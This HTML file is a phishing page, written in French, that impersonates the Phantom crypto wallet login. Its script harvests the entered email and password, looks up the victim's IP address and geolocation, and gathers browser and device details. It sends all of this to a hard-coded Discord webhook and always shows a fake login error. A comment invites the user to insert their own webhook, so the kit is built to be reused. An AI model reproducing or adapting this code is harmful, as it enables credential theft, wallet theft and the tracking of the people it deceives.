<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Phantom - Connexion</title>
  <link rel="icon" href="https://phantom.app/favicon.ico" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0d0d0d;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: #1a1a1a;
      padding: 40px;
      border-radius: 16px;
      width: 100%;
      max-width: 380px;
      border: 1px solid #333;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo img {
      width: 60px;
      height: 60px;
      border-radius: 12px;
    }
    h1 {
      text-align: center;
      font-size: 1.5rem;
      margin-bottom: 8px;
      font-weight: 600;
    }
    p {
      text-align: center;
      font-size: 0.9rem;
      color: #aaa;
      margin-bottom: 30px;
    }
    .input-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      font-size: 0.85rem;
      color: #ccc;
      margin-bottom: 6px;
    }
    input {
      width: 100%;
      padding: 12px 14px;
      background: #2a2a2a;
      border: 1px solid #444;
      border-radius: 8px;
      color: #fff;
      font-size: 1rem;
      transition: border 0.2s;
    }
    input:focus {
      outline: none;
      border-color: #9d4edd;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #9d4edd;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover {
      background: #8a3fc7;
    }
    button:disabled {
      background: #555;
      cursor: not-allowed;
    }
    .error {
      margin-top: 15px;
      padding: 12px;
      background: #4a1a1a;
      color: #ff6b6b;
      border: 1px solid #ff6b6b;
      border-radius: 8px;
      text-align: center;
      font-size: 0.9rem;
      font-weight: 500;
      display: none;
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 0.75rem;
      color: #666;
    }
    .footer a { color: #9d4edd; text-decoration: none; }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="https://phantom.app/img/phantom-logo.png" alt="Phantom">
    </div>
    <h1>Connectez-vous à Phantom</h1>
    <p>Accédez à votre portefeuille en toute sécurité</p>

    <form id="loginForm">
      <div class="input-group">
        <label for="email">Email</label>
        <input type="email" id="email" required placeholder="votre@email.com" />
      </div>

      <div class="input-group">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required placeholder="••••••••" />
      </div>

      <button type="submit">Se connecter</button>
    </form>

    <div id="errorMsg" class="error">
      Identifiants incorrects. Veuillez réessayer.
    </div>

    <div class="footer">
      <a href="https://phantom.app" target="_blank">phantom.app</a> © 2025
    </div>
  </div>

  <script>
    // === TON WEBHOOK DISCORD (CHANGE ÇA !) ===
    const webhookUrl = 'https://discord.com/api/webhooks/1438218976726483119/q5dZNqWwIPtd43lrskiwbQykWXS9WJHNP562rUWFgGdrUVRJxAWmwuaKmqSP1DU3A9tA';
    const enableDiscord = webhookUrl.includes('webhooks/');

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      const errorMsg = document.getElementById('errorMsg');
      const submitBtn = this.querySelector('button');
      const originalText = submitBtn.textContent;

      submitBtn.disabled = true;
      submitBtn.textContent = 'Connexion...';

      // === INFOS TECHNIQUES ===
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const screenRes = `${screen.width}x${screen.height}`;
      const timestamp = new Date().toLocaleString('fr-FR');

      let publicIP = 'Inconnue';
      let location = { city: 'N/A', region: 'N/A', country: 'N/A', lat: 'N/A', lon: 'N/A', accuracy: 'N/A' };

      // === IP + GÉOLOC (ip-api.com) ===
      try {
        const res = await fetch('http://ip-api.com/json/?fields=query,country,regionName,city,lat,lon,accuracy_radius');
        const data = await res.json();
        if (data.query) {
          publicIP = data.query;
          location = {
            city: data.city || 'Inconnue',
            region: data.regionName || 'Inconnue',
            country: data.country || 'Inconnu',
            lat: data.lat || 'N/A',
            lon: data.lon || 'N/A',
            accuracy: data.accuracy_radius ? `${data.accuracy_radius} km` : '~5 km'
          };
        }
      } catch (err) {}

      // === DONNÉES À ENVOYER ===
      const infos = {
        "Email": email,
        "Mot de passe": password,
        "IP IPv4": publicIP,
        "Ville": location.city,
        "Région": location.region,
        "Pays": location.country,
        "Coordonnées": `${location.lat}, ${location.lon}`,
        "Précision": location.accuracy,
        "Navigateur": userAgent,
        "OS": platform,
        "Langue": language,
        "Fuseau": timezone,
        "Écran": screenRes,
        "Heure": timestamp
      };

      // === ENVOI À DISCORD ===
      if (enableDiscord) {
        try {
          const embed = {
            title: 'Phantom - Tentative de Connexion',
            color: 0x9d4edd,
            thumbnail: { url: 'https://phantom.app/img/phantom-logo.png' },
            fields: [
              { name: 'IP IPv4', value: `\`\`\`${publicIP}\`\`\``, inline: true },
              { name: 'Localisation', value: `\`\`\`${location.city}, ${location.country}\`\`\``, inline: true },
              { name: 'Précision', value: `\`\`\`${location.accuracy}\`\`\``, inline: true },
              ...Object.entries(infos)
                .filter(([k]) => !['IP IPv4', 'Ville', 'Région', 'Pays', 'Coordonnées', 'Précision'].includes(k))
                .map(([name, value]) => ({ name, value: `\`\`\`${value}\`\`\``, inline: false }))
            ],
            timestamp: new Date().toISOString(),
            footer: { text: 'Phantom Login Capture' }
          };

          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: 'Phantom Security',
              avatar_url: 'https://phantom.app/img/phantom-logo.png',
              embeds: [embed]
            })
          });
        } catch (err) {}
      }

      // === ERREUR TOUJOURS AFFICHÉE ===
      setTimeout(() => {
        errorMsg.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
      }, 800);

      document.getElementById('password').value = '';
    });
  </script>
</body>
</html>
